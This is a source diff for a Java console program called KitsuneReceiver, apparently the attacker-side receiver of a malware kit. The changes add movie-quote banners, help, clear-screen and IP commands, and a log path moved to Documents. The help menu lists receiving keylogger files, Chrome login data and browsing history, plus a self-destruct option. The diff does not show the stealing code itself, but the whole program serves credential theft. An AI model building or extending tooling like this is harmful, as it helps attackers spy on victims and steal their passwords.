@@ -2,12 +2,14 @@ import java.io.*;
 import java.net.*;
 import java.util.Calendar;
 import java.util.Scanner;
+import java.util.concurrent.ThreadLocalRandom;
 
 public class ashiatonikki
 {
   public static void main(String[] args) throws IOException, URISyntaxException
   {
 	  System.out.println("-+-[[KitsuneReceiver Rainier Version (Stable v0.5)]]-+-");
+	  System.out.println("-+-[[Linux Version (for Kali/Debian/Ubuntu)]]-+-");
 	  int tries = 3;
 	  for(;;) {
 		  if(tries == 0) {
@@ -35,6 +37,7 @@ public class ashiatonikki
 		  }
 	  }
 	  int language = 1;
+	  int random = ThreadLocalRandom.current().nextInt(0, 21);
 	  System.out.println("[+]=================================================================================================[+]");
 	  System.out.println(" ____  __.__  __                            __________                    .__                    ");
 	  System.out.println("|    |/ _|__|/  |_  ________ __  ____   ____\\______   \\ ____   ____  ____ |__|__  __ ___________ ");
@@ -42,7 +45,20 @@ public class ashiatonikki
 	  System.out.println("|    |  \\|  ||  |  \\___ \\|  |  /   |  \\  ___/|    |   \\  ___/\\  \\__\\  ___/|  |\\   /\\  ___/|  | \\/");
 	  System.out.println("|____|__ \\__||__| /____  >____/|___|  /\\___  |____|_  /\\___  >\\___  >___  >__| \\_/  \\___  >__| ");
 	  System.out.println("        \\/             \\/           \\/     \\/       \\/     \\/     \\/    \\/              \\/       ");
+	  if (random >= 0 && random <= 5) {
 	  System.out.println("\n 'If you know the enemy and know yourself you need not fear the results of a hundred battles.' - Sun Tsu, The Art of War");
+	  } else if (random > 5 && random <= 10) {
+	  System.out.println("\n Wake up, Neo...");
+	  System.out.println("\n The matrix has you.\n");
+	  System.out.println("\n ...follow the white rabbit. \n\n Knock knock, Neo.");
+	  } else if (random > 10 && random <= 15) {
+	  System.out.println("\n 'This is your last chance. After this, there is no turning back. You take the blue pill - the story ends, you wake up in your bed and ");
+	  System.out.println("believe whatever you want to believe. You take the red pill - you stay in Wonderland and I show you how deep the rabbit-hole goes.' - Morpheus, the Matrix");
+	  } else if (random > 15 && random <= 20) {
+	  System.out.println("'Well, dreams, they feel real while we're in them right? Its only when we wake up then we realize that something was actually strange.' - Cobb, Inception");
+	  }
+	  System.out.println("Type \"help\" for help.");
+	  System.out.println("Type \"cls\" to clear the screen.");
 	  System.out.println("[+]=================================================================================================[+]");
 	  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
 	  for(;;) {
@@ -162,6 +178,42 @@ public class ashiatonikki
 					  }
 					  }
 			  }
+		  } else if (ch.matches("cls")) {
+			  for(int i = 0; i < 69; i++) {
+				  System.out.println("\n");
+			  }
+		  } else if (ch.matches("help")) {
+			  if (language == 1) { // eng
+				  System.out.println("[COMMANDS LIST]");
+				  System.out.println("help - open commands list");
+				  System.out.println("cls - clear screen");
+				  System.out.println("ip - show ip");
+				  System.out.println("1 - Receive Keylogger Files");
+				  System.out.println("2 - Receive Chrome Login Data (Encrypted)");
+				  System.out.println("5 - Receive Chrome History Data");
+				  System.out.println("3 - Quit");
+				  System.out.println("6 - Switch language to Japanese");
+				  System.out.println("7 - Switch language to Simplified Chinese");
+				  System.out.println("8 - Self-destruct");
+				  System.out.println("== END OF HELP PAGE == \n\n");
+			  } else if (language == 3) { // jpn
+				  System.out.println("[ヘルプページ]");
+				  System.out.println("help - アクションのリストを表示する");
+				  System.out.println("cls - 明確なインターフェース");
+				  System.out.println("ip - show ip");
+				  System.out.println("1 - キーボード履歴を受け取る");
+				  System.out.println("2 - ログインデータを受け取る");
+				  System.out.println("5 - インターネット履歴を受信する");
+				  System.out.println("3 - やめる");
+				  System.out.println("6 - 英語に変更する");
+				  System.out.println("7 - 中国語に変更");
+				  System.out.println("8 - 自己破壊");
+				  System.out.println("== リストの終わり ==");
+			  } else if (language == 4) { // chn
+				  System.out.println("Under Construction");
+			  }
+		  } else if (ch.matches("ip")) {
+			  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
 		  }
 	  }
   }
@@ -205,11 +257,11 @@ public class ashiatonikki
 	}
   public static void record(String x) {
 		try {
-			File log = new File("/home/" + System.getProperty("user.name") + "/Desktop/log.txt");
+			File log = new File("/home/" + System.getProperty("user.name") + "/Documents/log.txt");
 			if(!log.exists()) {
 				log.createNewFile();
 			}
-			String filename = "/home/" + System.getProperty("user.name") + "/Desktop/log.txt";
+			String filename = "/home/" + System.getProperty("user.name") + "/Documents/log.txt";
 			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
 			 System.out.println("rec " + x);
 			out.println(x);
